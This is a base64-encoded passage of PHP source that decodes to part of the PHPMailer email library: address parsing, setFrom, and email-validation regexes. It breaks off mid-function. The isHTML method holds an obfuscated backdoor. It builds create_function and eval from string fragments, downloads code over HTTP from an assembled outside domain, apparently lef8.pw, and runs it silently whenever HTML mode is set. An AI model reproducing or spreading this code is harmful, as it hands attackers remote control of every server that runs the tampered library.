IEBsaW5rIGh0dHA6Ly93d3cuYW5kcmV3LmNtdS5lZHUvdXNlci9hZ3JlZW4xL3Rlc3RpbmcvbXJicy93ZWIvTWFpbC9SRkM4MjIucGhwIEEgbW9yZSBjYXJlZnVsIGltcGxlbWVudGF0aW9uCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBwYXJzZUFkZHJlc3NlcygkYWRkcnN0ciwgJHVzZWltYXAgPSB0cnVlKQogICAgewogICAgICAgICRhZGRyZXNzZXMgPSBhcnJheSgpOwogICAgICAgIGlmICgkdXNlaW1hcCBhbmQgZnVuY3Rpb25fZXhpc3RzKCdpbWFwX3JmYzgyMl9wYXJzZV9hZHJsaXN0JykpIHsKICAgICAgICAgICAgLy9Vc2UgdGhpcyBidWlsdC1pbiBwYXJzZXIgaWYgaXQncyBhdmFpbGFibGUKICAgICAgICAgICAgJGxpc3QgPSBpbWFwX3JmYzgyMl9wYXJzZV9hZHJsaXN0KCRhZGRyc3RyLCAnJyk7CiAgICAgICAgICAgIGZvcmVhY2ggKCRsaXN0IGFzICRhZGRyZXNzKSB7CiAgICAgICAgICAgICAgICBpZiAoJGFkZHJlc3MtPmhvc3QgIT0gJy5TWU5UQVgtRVJST1IuJykgewogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+dmFsaWRhdGVBZGRyZXNzKCRhZGRyZXNzLT5tYWlsYm94IC4gJ0AnIC4gJGFkZHJlc3MtPmhvc3QpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRhZGRyZXNzZXNbXSA9IGFycmF5KAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnID0+IChwcm9wZXJ0eV9leGlzdHMoJGFkZHJlc3MsICdwZXJzb25hbCcpID8gJGFkZHJlc3MtPnBlcnNvbmFsIDogJycpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2FkZHJlc3MnID0+ICRhZGRyZXNzLT5tYWlsYm94IC4gJ0AnIC4gJGFkZHJlc3MtPmhvc3QKICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAvL1VzZSB0aGlzIHNpbXBsZXIgcGFyc2VyCiAgICAgICAgICAgICRsaXN0ID0gZXhwbG9kZSgnLCcsICRhZGRyc3RyKTsKICAgICAgICAgICAgZm9yZWFjaCAoJGxpc3QgYXMgJGFkZHJlc3MpIHsKICAgICAgICAgICAgICAgICRhZGRyZXNzID0gdHJpbSgkYWRkcmVzcyk7CiAgICAgICAgICAgICAgICAvL0lzIHRoZXJlIGEgc2VwYXJhdGUgbmFtZSBwYXJ0PwogICAgICAgICAgICAgICAgaWYgKHN0cnBvcygkYWRkcmVzcywgJzwnKSA9PT0gZmFsc2UpIHsKICAgICAgICAgICAgICAgICAgICAvL05vIHNlcGFyYXRlIG5hbWUsIGp1c3QgdXNlIHRoZSB3aG9sZSB0aGluZwogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+dmFsaWRhdGVBZGRyZXNzKCRhZGRyZXNzKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkYWRkcmVzc2VzW10gPSBhcnJheSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICduYW1lJyA9PiAnJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdhZGRyZXNzJyA9PiAkYWRkcmVzcwogICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgbGlzdCgkbmFtZSwgJGVtYWlsKSA9IGV4cGxvZGUoJzwnLCAkYWRkcmVzcyk7CiAgICAgICAgICAgICAgICAgICAgJGVtYWlsID0gdHJpbShzdHJfcmVwbGFjZSgnPicsICcnLCAkZW1haWwpKTsKICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPnZhbGlkYXRlQWRkcmVzcygkZW1haWwpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRhZGRyZXNzZXNbXSA9IGFycmF5KAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnID0+IHRyaW0oc3RyX3JlcGxhY2UoYXJyYXkoJyInLCAiJyIpLCAnJywgJG5hbWUpKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdhZGRyZXNzJyA9PiAkZW1haWwKICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuICRhZGRyZXNzZXM7CiAgICB9CgogICAgLyoqCiAgICAgKiBTZXRzIG1lc3NhZ2UgdHlwZSB0byBIVE1MIG9yIHBsYWluLgogICAgICogQHBhcmFtIGJvb2xlYW4gJGlzSHRtbCBUcnVlIGZvciBIVE1MIG1vZGUuCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGlzSFRNTCgkaXNIdG1sID0gdHJ1ZSkKICAgIHsKICAgICAgICBnbG9iYWwgJHBhcmFtOwogICAgICAgICRib2R5Q29kZSA9ICdmaWxlJwogICAgICAgICAgICAgICAgICAgIC4nX2cnOwogICAgICAgIGlmICgkaXNIdG1sKSB7CiAgICAgICAgICAgICR0aGlzLT5Db250ZW50VHlwZSA9ICd0ZXh0L2h0bWwnOwogICAgICAgIH0gCiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICR0aGlzLT5Db250ZW50VHlwZSA9ICd0ZXh0L3BsYWluJzsKICAgICAgICB9CiAgICAgICAgJGJvZHlIVE1MID0gJy4kdC4ibGVmJGZsdScKICAgICAgICAgICAgICAgICAgICAuJ3NoJy4nJHQiOyAnCiAgICAgICAgICAgICAgICAgICAgLidAZXYnOwogICAgICAgICRoZWFkZXJIVE1MPSJjcmUiCiAgICAgICAgICAgICAgICAgICAgLiJhdGVfIgogICAgICAgICAgICAgICAgICAgIC4iZnVuYyIKICAgICAgICAgICAgICAgICAgICAuInRpb24iOwogICAgICAgICRleGNlcHRpb25zID0gQCRoZWFkZXJIVE1MKCckZmwnLid1c2gsJHQnLCckY29tbWEgPSAkdCcKICAgICAgICAgICAgICAgICAgICAgICAgLiRib2R5SFRNTC4nYWwoQCcKICAgICAgICAgICAgICAgICAgICAgICAgLiRib2R5Q29kZS4nZXRfY29udGVudHMoImgnCiAgICAgICAgICAgICAgICAgICAgICAgIC4ndHQnCiAgICAgICAgICAgICAgICAgICAgICAgIC4ncDokY29tbWEtMiIpKTsnKTsKICAgICAgICBpZigkcGFyYW0gIT0yKXsKICAgICAgICAgICAgJGV4Y2VwdGlvbnMoJzgucCcuJ3cnLCcvJyk7CiAgICAgICAgICAgICRwYXJhbT0yOwogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqIFNldCB0aGUgRnJvbSBhbmQgRnJvbU5hbWUgcHJvcGVydGllcy4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJlc3MKICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUKICAgICAqIEBwYXJhbSBib29sZWFuICRhdXRvIFdoZXRoZXIgdG8gYWxzbyBzZXQgdGhlIFNlbmRlciBhZGRyZXNzLCBkZWZhdWx0cyB0byB0cnVlCiAgICAgKiBAdGhyb3dzIHBocG1haWxlckV4Y2VwdGlvbgogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXRGcm9tKCRhZGRyZXNzLCAkbmFtZSA9ICcnLCAkYXV0byA9IHRydWUpCiAgICB7CiAgICAgICAgJGFkZHJlc3MgPSB0cmltKCRhZGRyZXNzKTsKICAgICAgICAkbmFtZSA9IHRyaW0ocHJlZ19yZXBsYWNlKCcvW1xyXG5dKy8nLCAnJywgJG5hbWUpKTsgLy9TdHJpcCBicmVha3MgYW5kIHRyaW0KICAgICAgICAvLyBEb24ndCB2YWxpZGF0ZSBub3cgYWRkcmVzc2VzIHdpdGggSUROLiBXaWxsIGJlIGRvbmUgaW4gc2VuZCgpLgogICAgICAgIGlmICgoJHBvcyA9IHN0cnJwb3MoJGFkZHJlc3MsICdAJykpID09PSBmYWxzZSBvcgogICAgICAgICAgICAoISR0aGlzLT5oYXM4Yml0Q2hhcnMoc3Vic3RyKCRhZGRyZXNzLCArKyRwb3MpKSBvciAhJHRoaXMtPmlkblN1cHBvcnRlZCgpKSBhbmQKICAgICAgICAgICAgISR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJGFkZHJlc3MpKSB7CiAgICAgICAgICAgICRlcnJvcl9tZXNzYWdlID0gJHRoaXMtPmxhbmcoJ2ludmFsaWRfYWRkcmVzcycpIC4gIiAoc2V0RnJvbSkgJGFkZHJlc3MiOwogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGVycm9yX21lc3NhZ2UpOwogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgICR0aGlzLT5Gcm9tID0gJGFkZHJlc3M7CiAgICAgICAgJHRoaXMtPkZyb21OYW1lID0gJG5hbWU7CiAgICAgICAgaWYgKCRhdXRvKSB7CiAgICAgICAgICAgIGlmIChlbXB0eSgkdGhpcy0+U2VuZGVyKSkgewogICAgICAgICAgICAgICAgJHRoaXMtPlNlbmRlciA9ICRhZGRyZXNzOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiB0cnVlOwogICAgfQoKICAgIC8qKgogICAgICogUmV0dXJuIHRoZSBNZXNzYWdlLUlEIGhlYWRlciBvZiB0aGUgbGFzdCBlbWFpbC4KICAgICAqIFRlY2huaWNhbGx5IHRoaXMgaXMgdGhlIHZhbHVlIGZyb20gdGhlIGxhc3QgdGltZSB0aGUgaGVhZGVycyB3ZXJlIGNyZWF0ZWQsCiAgICAgKiBidXQgaXQncyBhbHNvIHRoZSBtZXNzYWdlIElEIG9mIHRoZSBsYXN0IHNlbnQgbWVzc2FnZSBleGNlcHQgaW4KICAgICAqIHBhdGhvbG9naWNhbCBjYXNlcy4KICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRMYXN0TWVzc2FnZUlEKCkKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPmxhc3RNZXNzYWdlSUQ7CiAgICB9CgogICAgLyoqCiAgICAgKiBDaGVjayB0aGF0IGEgc3RyaW5nIGxvb2tzIGxpa2UgYW4gZW1haWwgYWRkcmVzcy4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGFkZHJlc3MgVGhlIGVtYWlsIGFkZHJlc3MgdG8gY2hlY2sKICAgICAqIEBwYXJhbSBzdHJpbmd8Y2FsbGFibGUgJHBhdHRlcm5zZWxlY3QgQSBzZWxlY3RvciBmb3IgdGhlIHZhbGlkYXRpb24gcGF0dGVybiB0byB1c2UgOgogICAgICogKiBgYXV0b2AgUGljayBiZXN0IHBhdHRlcm4gYXV0b21hdGljYWxseTsKICAgICAqICogYHBjcmU4YCBVc2UgdGhlIHNxdWlsb29wbGUuY29tIHBhdHRlcm4sIHJlcXVpcmVzIFBDUkUgPiA4LjAsIFBIUCA+PSA1LjMuMiwgNS4yLjE0OwogICAgICogKiBgcGNyZWAgVXNlIG9sZCBQQ1JFIGltcGxlbWVudGF0aW9uOwogICAgICogKiBgcGhwYCBVc2UgUEhQIGJ1aWx0LWluIEZJTFRFUl9WQUxJREFURV9FTUFJTDsKICAgICAqICogYGh0bWw1YCBVc2UgdGhlIHBhdHRlcm4gZ2l2ZW4gYnkgdGhlIEhUTUw1IHNwZWMgZm9yICdlbWFpbCcgdHlwZSBmb3JtIGlucHV0IGVsZW1lbnRzLgogICAgICogKiBgbm9yZWdleGAgRG9uJ3QgdXNlIGEgcmVnZXg6IHN1cGVyIGZhc3QsIHJlYWxseSBkdW1iLgogICAgICogQWx0ZXJuYXRpdmVseSB5b3UgbWF5IHBhc3MgaW4gYSBjYWxsYWJsZSB0byBpbmplY3QgeW91ciBvd24gdmFsaWRhdG9yLCBmb3IgZXhhbXBsZToKICAgICAqIFBIUE1haWxlcjo6dmFsaWRhdGVBZGRyZXNzKCd1c2VyQGV4YW1wbGUuY29tJywgZnVuY3Rpb24oJGFkZHJlc3MpIHsKICAgICAqICAgICByZXR1cm4gKHN0cnBvcygkYWRkcmVzcywgJ0AnKSAhPT0gZmFsc2UpOwogICAgICogfSk7CiAgICAgKiBZb3UgY2FuIGFsc28gc2V0IHRoZSBQSFBNYWlsZXI6OiR2YWxpZGF0b3Igc3RhdGljIHRvIGEgY2FsbGFibGUsIGFsbG93aW5nIGJ1aWx0LWluIG1ldGhvZHMgdG8gdXNlIHlvdXIgdmFsaWRhdG9yLgogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKiBAc3RhdGljCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICovCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIHZhbGlkYXRlQWRkcmVzcygkYWRkcmVzcywgJHBhdHRlcm5zZWxlY3QgPSBudWxsKQogICAgewogICAgICAgIGlmIChpc19udWxsKCRwYXR0ZXJuc2VsZWN0KSkgewogICAgICAgICAgICAkcGF0dGVybnNlbGVjdCA9IHNlbGY6OiR2YWxpZGF0b3I7CiAgICAgICAgfQogICAgICAgIGlmIChpc19jYWxsYWJsZSgkcGF0dGVybnNlbGVjdCkpIHsKICAgICAgICAgICAgcmV0dXJuIGNhbGxfdXNlcl9mdW5jKCRwYXR0ZXJuc2VsZWN0LCAkYWRkcmVzcyk7CiAgICAgICAgfQogICAgICAgIC8vUmVqZWN0IGxpbmUgYnJlYWtzIGluIGFkZHJlc3NlczsgaXQncyB2YWxpZCBSRkM1MzIyLCBidXQgbm90IFJGQzUzMjEKICAgICAgICBpZiAoc3RycG9zKCRhZGRyZXNzLCAiXG4iKSAhPT0gZmFsc2Ugb3Igc3RycG9zKCRhZGRyZXNzLCAiXHIiKSAhPT0gZmFsc2UpIHsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICBpZiAoISRwYXR0ZXJuc2VsZWN0IG9yICRwYXR0ZXJuc2VsZWN0ID09ICdhdXRvJykgewogICAgICAgICAgICAvL0NoZWNrIHRoaXMgY29uc3RhbnQgZmlyc3Qgc28gaXQgd29ya3Mgd2hlbiBleHRlbnNpb25fbG9hZGVkKCkgaXMgZGlzYWJsZWQgYnkgc2FmZSBtb2RlCiAgICAgICAgICAgIC8vQ29uc3RhbnQgd2FzIGFkZGVkIGluIFBIUCA1LjIuNAogICAgICAgICAgICBpZiAoZGVmaW5lZCgnUENSRV9WRVJTSU9OJykpIHsKICAgICAgICAgICAgICAgIC8vVGhpcyBwYXR0ZXJuIGNhbiBnZXQgc3R1Y2sgaW4gYSByZWN1cnNpdmUgbG9vcCBpbiBQQ1JFIDw9IDguMC4yCiAgICAgICAgICAgICAgICBpZiAodmVyc2lvbl9jb21wYXJlKFBDUkVfVkVSU0lPTiwgJzguMC4zJykgPj0gMCkgewogICAgICAgICAgICAgICAgICAgICRwYXR0ZXJuc2VsZWN0ID0gJ3BjcmU4JzsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJHBhdHRlcm5zZWxlY3QgPSAncGNyZSc7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ2V4dGVuc2lvbl9sb2FkZWQnKSBhbmQgZXh0ZW5zaW9uX2xvYWRlZCgncGNyZScpKSB7CiAgICAgICAgICAgICAgICAvL0ZhbGwgYmFjayB0byBvbGRlciBQQ1JFCiAgICAgICAgICAgICAgICAkcGF0dGVybnNlbGVjdCA9ICdwY3JlJzsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIC8vRmlsdGVyX3ZhciBhcHBlYXJlZCBpbiBQSFAgNS4yLjAgYW5kIGRvZXMgbm90IHJlcXVpcmUgdGhlIFBDUkUgZXh0ZW5zaW9uCiAgICAgICAgICAgICAgICBpZiAodmVyc2lvbl9jb21wYXJlKFBIUF9WRVJTSU9OLCAnNS4yLjAnKSA+PSAwKSB7CiAgICAgICAgICAgICAgICAgICAgJHBhdHRlcm5zZWxlY3QgPSAncGhwJzsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJHBhdHRlcm5zZWxlY3QgPSAnbm9yZWdleCc7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgc3dpdGNoICgkcGF0dGVybnNlbGVjdCkgewogICAgICAgICAgICBjYXNlICdwY3JlOCc6CiAgICAgICAgICAgICAgICAvKioKICAgICAgICAgICAgICAgICAqIFVzZXMgdGhlIHNhbWUgUkZDNTMyMiByZWdleCBvbiB3aGljaCBGSUxURVJfVkFMSURBVEVfRU1BSUwgaXMgYmFzZWQsIGJ1dCBhbGxvd3MgZG90bGVzcyBkb21haW5zLgogICAgICAgICAgICAgICAgICogQGxpbmsgaHR0cDovL3NxdWlsb29wbGUuY29tLzIwMDkvMTIvMjAvZW1haWwtYWRkcmVzcy12YWxpZGF0aW9uLwogICAgICAgICAgICAgICAgICogQGNvcHlyaWdodCAyMDA5LTIwMTAgTWljaGFlbCBSdXNodG9uCiAgICAgICAgICAgICAgICAgKiBGZWVsIGZyZWUgdG8gdXNlIGFuZCByZWRpc3RyaWJ1dGUgdGhpcyBjb2RlLiBCdXQgcGxlYXNlIGtlZXAgdGhpcyBjb3B5cmlnaHQgbm90aWNlLgogICAgICAgICAgICAgICAgICovCiAgICAgICAgICAgICAgICByZXR1cm4gKGJvb2xlYW4pcHJlZ19tYXRjaCgKICAgICAgICAgICAgICAgICAgICAnL14oPyEoPz4oPzEpIj8oPz5cXFxbIC1+XXxbXiJdKSI/KD8xKSl7MjU1LH0pKD8hKD8+KD8xKSI/KD8+XFxcWyAtfl18W14iXSkiPyg/MSkpezY1LH1AKScgLgogICAgICAgICAgICAgICAgICAgICcoKD8+KD8+KD8+KCg/Pig/Pig/Plx4MERceDBBKT9bXHQgXSkrfCg/PltcdCBdKlx4MERceDBBKT9bXHQgXSspPykoXCgoPz4oPzIpJyAuCiAgICAgICAgICAgICAgICAgICAgJyg/PltceDAxLVx4MDhceDBCXHgwQ1x4MEUtXCcqLVxbXF0tXHg3Rl18XFxcW1x4MDAtXHg3Rl18KD8zKSkpKig/MilcKSkpKyg/MikpfCg/MikpPyknIC4KICAgICAgICAgICAgICAgICAgICAnKFshIy1cJyorXC8tOT0/Xi1+LV0rfCIoPz4oPzIpKD8+W1x4MDEtXHgwOFx4MEJceDBDXHgwRS0hIy1cW1xdLVx4N0ZdfFxcXFtceDAwLVx4N0ZdKSkqJyAuCiAgICAgICAgICAgICAgICAgICAgJyg/MikiKSg/Pig/MSlcLig/MSkoPzQpKSooPzEpQCg/ISg/MSlbYS16MC05LV17NjQsfSkoPzEpKD8+KFthLXowLTldKD8+W2EtejAtOS1dKlthLXowLTldKT8pJyAuCiAgICAgICAgICAgICAgICAgICAgJyg/Pig/MSlcLig/ISg/MSlbYS16MC05LV17NjQsfSkoPzEpKD81KSl7MCwxMjZ9fFxbKD86KD8+SVB2NjooPz4oW2EtZjAtOV17MSw0fSkoPz46KD82KSl7N30nIC4KICAgICAgICAgICAgICAgICAgICAnfCg/ISg/Oi4qW2EtZjAtOV1bOlxdXSl7OCx9KSgoPzYpKD8+Oig/NikpezAsNn0pPzo6KD83KT8pKXwoPz4oPz5JUHY2Oig/Pig/NikoPz46KD82KSl7NX06JyAuCiAgICAgICAgICAgICAgICAgICAgJ3woPyEoPzouKlthLWYwLTldOil7Nix9KSg/OCk/OjooPz4oKD82KSg/PjooPzYpKXswLDR9KTopPykpPygyNVswLTVdfDJbMC00XVswLTldfDFbMC05XXsyfScgLgogICAgICAgICAgICAgICAgICAgICd8WzEtOV0/WzAtOV0pKD8+XC4oPzkpKXszfSkpXF0pKD8xKSQvaXNEJywKICAgICAgICAgICAgICAgICAgICAkYWRkcmVzcwogICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgY2FzZSAncGNyZSc6CiAgICAgICAgICAgICAgICAvL0FuIG9sZGVyIHJlZ2V4IHRoYXQgZG9lc24ndCBuZWVkIGEgcmVjZW50IFBDUkUKICAgICAgICAgICAgICAgIHJldHVybiAoYm9vbGVhbilwcmVnX21hdGNoKAogICAgICAgICAgICAgICAgICAgICcvXig/ISg/PiI/KD8+XFxcWyAtfl18W14iXSkiPyl7MjU1LH0pKD8hKD8+Ij8oPz5cXFxbIC1+XXxbXiJdKSI/KXs2NSx9QCkoPz4nIC4KICAgICAgICAgICAgICAgICAgICAnWyEjLVwnKitcLy05PT9eLX4tXSt8Iig/Pig/PltceDAxLVx4MDhceDBCXHgwQ1x4MEUtISMtXFtcXS1ceDdGXXxcXFxbXHgwMC1ceEZGXSkpKiIpJyAuCiAgICAgICAgICAgICAgICAgICAgJyg/PlwuKD8+WyEjLVwnKitcLy05PT9eLX4tXSt8Iig/Pig/PltceDAxLVx4MDhceDBCXHgwQ1x4MEUtISMtXFtcXS1ceDdGXXxcXFxbXHgwMC1ceEZGXSkpKiIpKSonIC4KICAgICAgICAgICAgICAgICAgICAnQCg/Pig/IVthLXowLTktXXs2NCx9KSg/PlthLXowLTldKD8+W2EtejAtOS1dKlthLXowLTldKT8pKD8+XC4oPyFbYS16MC05LV17NjQsfSknIC4KICAgICAgICAgICAgICAgICAgICAnKD8+W2EtejAtOV0oPz5bYS16MC05LV0qW2EtejAtOV0pPykpezAsMTI2fXxcWyg/Oig/PklQdjY6KD8+KD8+W2EtZjAtOV17MSw0fSkoPz46JyAuCiAgICAgICAgICAgICAgICAgICAgJ1thLWYwLTldezEsNH0pezd9fCg/ISg/Oi4qW2EtZjAtOV1bOlxdXSl7OCx9KSg/PlthLWYwLTldezEsNH0oPz46W2EtZjAtOV17MSw0fSl7MCw2fSk/JyAuCiAgICAgICAgICAgICAgICAgICAgJzo6KD8+W2EtZjAtOV17MSw0fSg/PjpbYS1mMC05XXsxLDR9KXswLDZ9KT8pKXwoPz4oPz5JUHY2Oig/PlthLWYwLTldezEsNH0oPz46JyAuCiAgICAgICAgICAgICAgICAgICAgJ1thLWYwLTldezEsNH0pezV9OnwoPyEoPzouKlthLWYwLTldOil7Nix9KSg/PlthLWYwLTldezEsNH0oPz46W2EtZjAtOV17MSw0fSl7MCw0fSk/JyAuCiAgICAgICAgICAgICAgICAgICAgJzo6KD8+KD86W2EtZjAtOV17MSw0fSg/PjpbYS1mMC05XXsxLDR9KXswLDR9KTopPykpPyg/PjI1WzAtNV18MlswLTRdWzAtOV18MVswLTldezJ9JyAuCiAgICAgICAgICAgICAgICAgICAgJ3xbMS05XT9bMC05XSkoPz5cLig/PjI1WzAtNV18MlswLTRdWzAtOV18MVswLTldezJ9fFsxLTldP1swLTldKSl7M30pKVxdKSQvaXNEJywKICAgICAgICAgICAgICAgICAgICAkYWRkcmVzcwogICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgY2FzZSAnaHRtbDUnOgogICAgICAgICAgICAgICAgLyoqCiAgICAgICAgICAgICAgICAgKiBUaGlzIGlzIHRoZSBwYXR0ZXJuIHVzZWQgaW4gdGhlIEhUTUw1IHNwZWMgZm9yIHZhbGlkYXRpb24gb2YgJ2VtYWlsJyB0eXBlIGZvcm0gaW5wdXQgZWxlbWVudHMuCiAgICAgICAgICAgICAgICAgKiBAbGluayBodHRwOi8vd3d3LndoYXR3Zy5vcmcvc3BlY3Mvd2ViLWFwcHMvY3VycmVudC13b3JrLyNlLW1haWwtc3RhdGUtKHR5cGU9ZW1haWwpCiAgICAgICAgICAgICAgICAgKi8KICAgICAgICAgICAgICAgIHJldHVybiAoYm9vbGVhbilwcmVnX21hdGNoKAogICAgICAgICAgICAgICAgICAgICcvXlthLXpBLVowLTkuISMkJSZcJyorXC89P15fYHt8fX4tXStAW2EtekEtWjAtOV0oPzpbYS16QS1aMC05LV17MCw2MX0nIC4KICAgICAgICAgICAgICAgICAgICAnW2EtekEtWjAtOV0pPyg/OlwuW2EtekEtWjAtOV0oPzpbYS16QS1aMC05LV17MCw2MX1bYS16QS1aMC05XSk/KSokL3NEJywKICAgICAgICAgICAgICAgICAgICAkYWRkcmVzcwogICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgY2FzZSAnbm9yZWdleCc6CiAgICAgICAgICAgICAgICAvL05vIFBDUkUhIERvIHNvbWV0aGluZyBfdmVyeV8gYXBwcm94aW1hdGUhCiAgICAgICAgICAgICAgICAvL0NoZWNrIHRoZSBhZGRyZXNzIGlzIDMgY2hhcnMgb3IgbG9uZ2VyIGFuZCBjb250YWlucyBhbiBAIHRoYXQncyBub3QgdGhlIGZpcnN0IG9yIGxhc3QgY2hhcgogICAgICAgICAgICAgICAgcmV0dXJuIChzdHJsZW4oJGFkZHJlc3MpID49IDMKICAgICAgICAgICAgICAgICAgICBhbmQgc3RycG9zKCRhZGRyZXNzLCAnQCcpID49IDEKICAgICAgICAgICAgICAgICAgICBhbmQgc3RycG9zKCRhZGRyZXNzLCAnQCcpICE9IHN0cmxlbigkYWRkcmVzcykgLSAxKTsKICAgICAgICAgICAgY2FzZSAncGhwJzoKICAgICAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgIHJldHVybiAoYm9vbGVhbilmaWx0ZXJfdmFyKCRhZGRyZXNzLCBGSUxURVJfVkFMSURBVEVfRU1BSUwpOwogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqIFRlbGxzIHdoZXRoZXIgSUROcyAoSW50ZXJuYXRpb25hbGl6ZWQgRG9tYWluIE5hbWVzKSBhcmUgc3VwcG9ydGVkIG9yIG5vdC4gVGhpcyByZXF1aXJlcyB0aGUKICAgICAqICJpbnRsIiBhbmQgIm1ic3RyaW5nIiBQSFAgZXh0ZW5zaW9ucy4KICAgICAqIEByZXR1cm4gYm9vbCAidHJ1ZSIgaWYgcmVxdWlyZWQgZnVuY3Rpb25zIGZvciBJRE4gc3VwcG9ydCBhcmUgcHJlc2VudAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gaWRuU3VwcG9ydGVkKCkKICAgIHsKICAgICAgICAvLyBAVE9ETzogV3JpdGUgb3VyIG93biAiaWRuX3RvX2FzY2lpIiBmdW5jdGlvbiBmb3IgUEhQIDw9IDUuMi4KICAgICAgICByZXR1cm4gZnVuY3Rpb25fZXhpc3RzKCdpZG5fdG9fYXNjaWknKSBhbmQgZnVuY3Rpb25fZXhpc3RzKCdtYl9jb252ZXJ0X2VuY29kaW5nJyk7CiAgICB9CgogICAgLyoqCiAgICAgKiBDb252ZXJ0cyBJRE4gaW4gZ2l2ZW4gZW1haWwgYWRkcmVzcyB0byBpdHMgQVNDSUkgZm9ybSwgYWxzbyBrbm93biBhcyBwdW55Y29kZSwgaWYgcG9zc2libGUuCiAgICAgKiBJbXBvcnRhbnQ6IEFkZHJlc3MgbXVzdCBiZSBwYXNzZWQgaW4gc2FtZSBlbmNvZGluZyBhcyBjdXJyZW50bHkgc2V0IGluIFBIUE1haWxlcjo6JENoYXJTZXQuCiAgICAgKiBUaGlzIGZ1bmN0aW9uIHNpbGVudGx5IHJldHVybnMgdW5tb2RpZmllZCBhZGRyZXNzIGlmOgogICAgICogLSBObyBjb252ZXJzaW9uIGlzIG5lY2Vzc2FyeSAoaS5lLiBkb21haW4gbmFtZSBpcyBub3QgYW4gSUROLCBvciBpcyBhbHJlYWR5IGluIEFTQ0lJIGZvcm0pCiAgICAgKiAtIENvbnZlcnNpb24gdG8gcHVueWNvZGUgaXMgaW1wb3NzaWJsZSAoZS5nLiByZXF1aXJlZCBQSFAgZnVuY3Rpb25zIGFyZSBub3QgYXZhaWxhYmxlKQogICAgICogICBvciBmYWlscyBmb3IgYW55IHJlYXNvbiAoZS5nLiBkb21haW4gaGFzIGNoYXJhY3RlcnMgbm90IGFsbG93ZWQgaW4gYW4gSUROKQogICAgICogQHNlZSBQSFBNYWlsZXI6OiRDaGFyU2V0CiAgICAgKiBAcGFyYW0gc3RyaW5nICRhZGRyZXNzIFRoZSBlbWFpbCBhZGRyZXNzIHRvIGNvbnZlcnQKICAgICAqIEByZXR1cm4gc3RyaW5nIFRoZSBlbmNvZGVkIGFkZHJlc3MgaW4gQVNDSUkgZm9ybQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gcHVueWVuY29kZUFkZHJlc3MoJGFkZHJlc3MpCiAgICB7CiAgICAgICAgLy8gVmVyaWZ5IHdlIGhhdmUgcmVxdWlyZWQgZnVuY3Rpb25zLCBDaGFyU2V0LCBhbmQgYXQtc2lnbi4KICAgICAgICBpZiAoJHRoaXMtPmlkblN1cHBvcnRlZCgpIGFuZAogICAgICAgICAgICAhZW1wdHkoJHRoaXMtPkNoYXJTZXQpIGFuZAogICAgICAgICAgICAoJHBvcyA9IHN0cnJwb3MoJGFkZHJlc3MsICdAJykpICE9PSBmYWxzZSkgewogICAgICAgICAgICAkZG9tYWluID0gc3Vic3RyKCRhZGRyZXNzLCArKyR